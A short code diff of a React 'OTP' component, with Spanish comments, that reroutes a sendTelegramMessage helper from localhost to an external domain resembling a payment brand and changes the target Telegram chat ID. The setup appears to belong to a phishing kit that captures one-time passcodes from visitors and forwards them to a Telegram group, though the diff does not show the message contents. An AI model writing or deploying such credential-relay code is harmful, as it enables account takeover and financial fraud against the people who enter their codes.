@@ -23,12 +23,12 @@ const OTP = () => {
 
   const sendTelegramMessage = async (message) => {
     try {
-      const response = await fetch('http://localhost:3000/enviarmensaje', { // Asegúrate de que esta URL es correcta
+      const response = await fetch('https://streaming.pagafacilntf.com/enviarmensaje', { // Asegúrate de que esta URL es correcta
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify({ chatId: '-4542132850', message }), // Incluye chatId si es necesario
+        body: JSON.stringify({ chatId: '-4723241842', message }), // Incluye chatId si es necesario
       });
   
       if (!response.ok) {
